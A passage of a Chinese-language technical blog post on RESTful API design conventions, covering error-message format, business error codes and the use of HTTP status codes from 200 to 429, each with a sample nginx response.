class=\"number\">4001</span></span><br><span class=\"line\">X-MYNAME-<span class=\"built_in\">ERROR</span>-MESSAGE: Bad authentication <span class=\"built_in\">token</span></span><br><span class=\"line\">X-MYNAME-<span class=\"built_in\">ERROR</span>-INFO: http:<span class=\"comment\">//docs.example.com/api/v1/authentication</span></span><br></pre></td></tr></table></figure>\n<p>2、直接放入响应实体中；</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">401</span> Unauthorized</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache, private</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 10:02:59 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;\"error_code\":40100,\"message\":\"Unauthorized\"&#125;</span><br></pre></td></tr></table></figure>\n<p>考虑到易读性和客户端的易处理性，我们 必须 把错误信息直接放到响应实体中，并且错误格式 应该 满足如下格式：<br><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">\"message\"</span>: <span class=\"string\">\"您查找的资源不存在\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"error_code\"</span>: <span class=\"number\">404001</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>其中错误码（error_code）必须 和 HTTP 状态码对应，也方便错误码归类，如：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">429</span> Too Many Requests</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache, private</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 10:15:52 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;\"error_code\":429001,\"message\":\"你操作太频繁了\"&#125;</span><br></pre></td></tr></table></figure>\n<p>应该 在返回的错误信息中，同时包含面向开发者和面向用户的提示信息，前者可方便开发人员调试，后者可直接展示给终端用户查看如：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">\"message\"</span>: <span class=\"string\">\"直接展示给终端用户的错误信息\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"error_code\"</span>: <span class=\"string\">\"业务错误码\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"error\"</span>: <span class=\"string\">\"供开发者查看的错误信息\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"debug\"</span>: [</span><br><span class=\"line\">        <span class=\"string\">\"错误堆栈，必须开启 debug 才存在\"</span></span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>下面详细列举了各种情况 API 的返回说明。</p>\n<h3 id=\"200-ok\"><a href=\"#200-ok\" class=\"headerlink\" title=\"200 ok\"></a>200 ok</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">200 状态码是最常见的 HTTP 状态码，在所有 成功 的 <span class=\"builtin-name\">GET</span> 请求中，必须 返回此状态码。HTTP 响应实体部分 必须 直接就是数据，不要做多余的包装。</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">\"data\"</span>: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"string\">\"id\"</span>: 1,</span><br><span class=\"line\">            <span class=\"string\">\"avatar\"</span>: <span class=\"string\">\"https://lorempixel.com/640/480/?32556\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"nickname\"</span>: <span class=\"string\">\"fwest\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"last_logined_time\"</span>: <span class=\"string\">\"2018-05-29 04:56:43\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"has_registed\"</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"string\">\"id\"</span>: 2,</span><br><span class=\"line\">            <span class=\"string\">\"avatar\"</span>: <span class=\"string\">\"https://lorempixel.com/640/480/?86144\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"nickname\"</span>: <span class=\"string\">\"zschowalter\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"last_logined_time\"</span>: <span class=\"string\">\"2018-06-16 15:18:34\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"has_registed\"</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ],</span><br><span class=\"line\">    <span class=\"string\">\"meta\"</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">\"pagination\"</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">\"total\"</span>: 101,</span><br><span class=\"line\">            <span class=\"string\">\"count\"</span>: 2,</span><br><span class=\"line\">            <span class=\"string\">\"per_page\"</span>: 2,</span><br><span class=\"line\">            <span class=\"string\">\"current_page\"</span>: 1,</span><br><span class=\"line\">            <span class=\"string\">\"total_pages\"</span>: 51,</span><br><span class=\"line\">            <span class=\"string\">\"links\"</span>: &#123;</span><br><span class=\"line\">                <span class=\"string\">\"next\"</span>: <span class=\"string\">\"http://api.example.com?page=2\"</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>其中，分页和其他额外的媒体信息，必须放到 meta 字段中。</p>\n</blockquote>\n<h3 id=\"201-Created\"><a href=\"#201-Created\" class=\"headerlink\" title=\"201 Created\"></a>201 Created</h3><p>当服务器创建数据成功时，应该 返回此状态码。常见的应用场景是使用 POST 提交用户信息，如：</p>\n<ul>\n<li>添加了新用户</li>\n<li>上传了图片</li>\n<li>创建了新活动</li>\n</ul>\n<p>等，都可以返回 201 状态码。需要注意的是，你可以选择在用户创建成功后返回新用户的数据</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">201</span> Created</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 09:13:40 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    \"id\": 1,</span><br><span class=\"line\">    \"avatar\": \"https:\\/\\/lorempixel.com\\/640\\/480\\/?32556\",</span><br><span class=\"line\">    \"nickname\": \"fwest\",</span><br><span class=\"line\">    \"last_logined_time\": \"2018-05-29 04:56:43\",</span><br><span class=\"line\">    \"created_at\": \"2018-06-16 17:55:55\",</span><br><span class=\"line\">    \"updated_at\": \"2018-06-16 17:55:55\"</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>也可以返回一个响应实体为空的 HTTP Response 如：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">201</span> Created</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: text/html; charset=UTF-8</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 09:12:20 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>这里我们 应该 采用第二种方式，因为大多数情况下，客户端只需要知道该请求操作成功与否，并不需要返回新资源的信息。</p>\n</blockquote>\n<h3 id=\"202-Accepted\"><a href=\"#202-Accepted\" class=\"headerlink\" title=\"202 Accepted\"></a>202 Accepted</h3><p>该状态码表示服务器已经接受到了来自客户端的请求，但还未开始处理。常用短信发送、邮件通知、模板消息推送等这类很耗时需要队列支持的场景中；</p>\n<blockquote>\n<p>返回该状态码时，响应实体 必须 为空。</p>\n</blockquote>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">202</span> Accepted</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: text/html; charset=UTF-8</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 09:25:15 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br></pre></td></tr></table></figure>\n<h3 id=\"204-No-Content\"><a href=\"#204-No-Content\" class=\"headerlink\" title=\"204 No Content\"></a>204 No Content</h3><p>该状态码表示响应实体不包含任何数据，其中：</p>\n<p>在使用 DELETE 方法删除资源 成功 时，必须 返回该状态码<br>使用 PUT、PATCH 方法更新数据 成功 时，也 应该 返回此状态码</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">204</span> No Content</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 09:29:12 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br></pre></td></tr></table></figure>\n<h3 id=\"3xx-重定向\"><a href=\"#3xx-重定向\" class=\"headerlink\" title=\"3xx 重定向\"></a>3xx 重定向</h3><p>所有 API 一定不可 返回 3xx 类型的状态码。因为 3xx 类型的响应格式一般为下列格式:</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">302</span> Found</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: text/html; charset=UTF-8</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache, private</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 09:41:50 GMT</span><br><span class=\"line\"><span class=\"attribute\">Location</span>: https://example.com</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">    &lt;head&gt;</span><br><span class=\"line\">        &lt;meta charset=\"UTF-8\" /&gt;</span><br><span class=\"line\">        &lt;meta http-equiv=\"refresh\" content=\"0;url=https://example.com\" /&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;title&gt;Redirecting to https://example.com&lt;/title&gt;</span><br><span class=\"line\">    &lt;/head&gt;</span><br><span class=\"line\">    &lt;body&gt;</span><br><span class=\"line\">        Redirecting to &lt;a href=\"https://example.com\"&gt;https://example.com&lt;/a&gt;.</span><br><span class=\"line\">    &lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>API 一定不可 返回纯 HTML 结构的响应；若一定要使用重定向功能，应该 返回一个响应实体为空的 3xx 响应，并在响应头中加上 Location 字段:</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/<span class=\"number\">1.1</span> <span class=\"number\">302</span> Found</span><br><span class=\"line\"><span class=\"string\">Server:</span> nginx/<span class=\"number\">1.11</span><span class=\"number\">.9</span></span><br><span class=\"line\">Content-<span class=\"string\">Type:</span> text/html; charset=UTF<span class=\"number\">-8</span></span><br><span class=\"line\">Transfer-<span class=\"string\">Encoding:</span> chunked</span><br><span class=\"line\"><span class=\"string\">Date:</span> Sun, <span class=\"number\">24</span> Jun <span class=\"number\">2018</span> <span class=\"number\">09</span>:<span class=\"number\">52</span>:<span class=\"number\">50</span> GMT</span><br><span class=\"line\"><span class=\"string\">Location:</span> <span class=\"string\">https:</span><span class=\"comment\">//godruoyi.com</span></span><br><span class=\"line\"><span class=\"string\">Connection:</span> keep-alive</span><br></pre></td></tr></table></figure>\n<h3 id=\"400-Bad-Request\"><a href=\"#400-Bad-Request\" class=\"headerlink\" title=\"400 Bad Request\"></a>400 Bad Request</h3><p>由于明显的客户端错误（例如，请求语法格式错误、无效的请求、无效的签名等），服务器 应该 放弃该请求。</p>\n<blockquote>\n<p>当服务器无法从其他 4xx 类型的状态码中找出合适的来表示错误类型时，都 必须 返回该状态码。</p>\n</blockquote>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">400</span> Bad Request</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache, private</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 13:22:36 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;\"error_code\":40000,\"message\":\"无效的签名\"&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"401-Unauthorized\"><a href=\"#401-Unauthorized\" class=\"headerlink\" title=\"401 Unauthorized\"></a>401 Unauthorized</h3><p>该状态码表示当前请求需要身份认证，以下情况都 必须 返回该状态码。</p>\n<ul>\n<li>未认证用户访问需要认证的 API</li>\n<li>access_token 无效/过期</li>\n<li>客户端在收到 401 响应后，都 应该 提示用户进行下一步的登录操作。</li>\n</ul>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">401</span> Unauthorized</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">WWW-Authenticate</span>: JWTAuth</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache, private</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 13:17:02 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">\"message\":\"Token Signature could not be verified.\",\"error_code\": \"40100\"&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"403-Forbidden\"><a href=\"#403-Forbidden\" class=\"headerlink\" title=\"403 Forbidden\"></a>403 Forbidden</h3><p>该状态码可以简单的理解为没有权限访问该请求，服务器收到请求但拒绝提供服务。</p>\n<p>如当普通用户请求操作管理员用户时，必须 返回该状态码。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">403</span> Forbidden</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache, private</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 13:05:34 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;\"error_code\":40301,\"message\":\"权限不足\"&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"404-Not-Found\"><a href=\"#404-Not-Found\" class=\"headerlink\" title=\"404 Not Found\"></a>404 Not Found</h3><p>该状态码表示用户请求的资源不存在，如</p>\n<ul>\n<li>获取不存在的用户信息 （get /users/9999999）</li>\n<li>访问不存在的端点</li>\n</ul>\n<p>都 必须 返回该状态码，若该资源已永久不存在，则 应该 返回 401 响应。</p>\n<h3 id=\"405-Method-Not-Allowd\"><a href=\"#405-Method-Not-Allowd\" class=\"headerlink\" title=\"405 Method Not Allowd\"></a>405 Method Not Allowd</h3><p>当客户端使用的 HTTP 请求方法不被服务器允许时，必须 返回该状态码。</p>\n<blockquote>\n<p>如客户端调用了 POST 方法来访问只支持 GET 方法的 API</p>\n</blockquote>\n<p>该响应 必须 返回一个 Allow 头信息用以表示出当前资源能够接受的请求方法的列表。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">405</span> Method Not Allowed</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">Allow</span>: GET, HEAD</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache, private</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 12:30:57 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;\"message\":\"405 Method Not Allowed\",\"error_code\": 40500&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"406-Not-Acceptable\"><a href=\"#406-Not-Acceptable\" class=\"headerlink\" title=\"406 Not Acceptable\"></a>406 Not Acceptable</h3><p>API 在不支持客户端指定的数据格式时，应该返回此状态码。如支持 JSON 和 XML 输出的 API 被指定返回 YAML 格式的数据时。</p>\n<blockquote>\n<p>Http 协议一般通过请求首部的 Accept 来指定数据格式</p>\n</blockquote>\n<h3 id=\"408-Request-Timeout\"><a href=\"#408-Request-Timeout\" class=\"headerlink\" title=\"408 Request Timeout\"></a>408 Request Timeout</h3><p>客户端请求超时时 必须 返回该状态码，需要注意的时，该状态码表示 客户端请求超时，在涉及第三方 API 调用超时时，一定不可 返回该状态码。</p>\n<h3 id=\"409-Gonfilct\"><a href=\"#409-Gonfilct\" class=\"headerlink\" title=\"409 Gonfilct\"></a>409 Gonfilct</h3><p>该状态码表示因为请求存在冲突无法处理。如通过手机号码提供注册功能的 API，当用户提交的手机号已存在时，必须 返回此状态码。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">409</span> Conflict</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache, private</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 12:19:04 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;\"error_code\":40900,\"message\":\"手机号已存在\"&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"410-Gone\"><a href=\"#410-Gone\" class=\"headerlink\" title=\"410 Gone\"></a>410 Gone</h3><p>和 404 类似，该状态码也表示请求的资源不存在，只是 410 状态码进一步表示所请求的资源已不存在，并且未来也不会存在。在收到 410 状态码后，客户端 应该 停止再次请求该资源。</p>\n<h3 id=\"413-Request-Entity-Too-Large\"><a href=\"#413-Request-Entity-Too-Large\" class=\"headerlink\" title=\"413 Request Entity Too Large\"></a>413 Request Entity Too Large</h3><p>该状态码表示服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。</p>\n<blockquote>\n<p>此种情况下，服务器可以关闭连接以免客户端继续发送此请求。</p>\n</blockquote>\n<p>如果这个状况是临时的，服务器 应该 返回一个 Retry-After 的响应头，以告知客户端可以在多少时间以后重新尝试。</p>\n<h3 id=\"414-Request-URI-Too-Long\"><a href=\"#414-Request-URI-Too-Long\" class=\"headerlink\" title=\"414 Request-URI Too Long\"></a>414 Request-URI Too Long</h3><p>该状态码表示请求的 URI 长度超过了服务器能够解释的长度，因此服务器拒绝对该请求提供服务。</p>\n<h3 id=\"415-Unsupported-Media-Type\"><a href=\"#415-Unsupported-Media-Type\" class=\"headerlink\" title=\"415 Unsupported Media Type\"></a>415 Unsupported Media Type</h3><p>通常表示服务器不支持客户端请求首部 Content-Type 指定的数据格式。如在只接受 JSON 格式的 API 中放入 XML 类型的数据并向服务器发送，都 应该 返回该状态码。</p>\n<p>该状态码也可用于如：只允许上传图片格式的文件，但是客户端提交媒体文件非法或不是图片类型，这时 应该 返回该状态码：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">415</span> Unsupported Media Type</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/json</span><br><span class=\"line\"><span class=\"attribute\">Transfer-Encoding</span>: chunked</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache, private</span><br><span class=\"line\"><span class=\"attribute\">Date</span>: Sun, 24 Jun 2018 12:09:40 GMT</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;\"error_code\":41500,\"message\":\"不允许上传的图片格式\"&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"429-Too-Many-Request\"><a href=\"#429-Too-Many-Request\" class=\"headerlink\" title=\"429 Too Many Request\"></a>429 Too Many Request</h3><p>该状态码表示用户请求次数超过允许范围。如 API 设定为 60次/分钟，当用户在一分钟内请求次数超过 60 次后，都 应该 返回该状态码。并且也 应该 在响应首部中加上下列头部：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">X-RateLimit-<span class=\"string\">Limit:</span> <span class=\"number\">10</span> 请求速率（由应用设定，其单位一般为小时<span class=\"regexp\">/分钟等，这里是 10次/</span><span class=\"number\">5</span>分钟）</span><br><span class=\"line\">X-RateLimit-<span class=\"string\">Remaining:</span> <span class=\"number\">0</span> 当前剩余的请求数量</span><br><span class=\"line\">X-RateLimit-<span class=\"string\">Reset:</span> <span class=\"number\">1529839462</span> 重置时间</span><br><span class=\"line\">Retry-<span class=\"string\">After:</span> <span class=\"number\">120</span> 下一次访问应该等待的时间（秒）</span><br></pre></td></tr></table></figure>\n<p>列子</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">429</span> Too Many Requests</span><br><span class=\"line\"><span class=\"attribute\">Server</span>: nginx/1.11.9</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: 